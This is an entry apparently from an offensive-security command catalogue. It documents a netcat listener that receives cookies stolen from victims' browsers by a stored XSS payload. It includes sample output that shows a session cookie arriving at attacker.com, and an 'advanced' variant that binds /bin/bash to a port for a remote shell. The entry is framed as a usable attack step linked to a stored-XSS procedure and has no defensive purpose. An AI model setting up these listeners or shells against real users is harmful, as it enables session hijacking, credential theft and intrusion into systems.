---
id: cmd-monitor-exfil
data: nc -lvp 80
tags:
  - exfiltration
  - monitoring
  - network
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T00:11:09.468Z'
verified: false
validated: true
submitted: true
---
# monitor-exfil-server

## Command

```bash
nc -lvp 80
```

## Description

This command uses netcat to listen on port 80 for incoming connections from the XSS payload, capturing exfiltrated data like cookies sent by the victim's browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-l` | Listen mode | Yes |
| `-v` | Verbose output | Yes |
| `-p 80` | Port to listen on (HTTP default) | Yes |

## Examples

### Basic Usage

```bash
nc -lvp 80
```

### Advanced Usage

```bash
nc -lvp 8080 -e /bin/bash
```
(For interactive shell if payload escalates)

## Expected Output

Listening on [0.0.0.0] (family 0, port 80)
Connection from victim_ip port victim_port [tcp/http] accepted
GET /steal?cookie=vk_session=abc123 HTTP/1.1
Host: attacker.com
...

## Related

- [[Related Procedure|procedures/Trigger-and-Execute-Stored-XSS]]
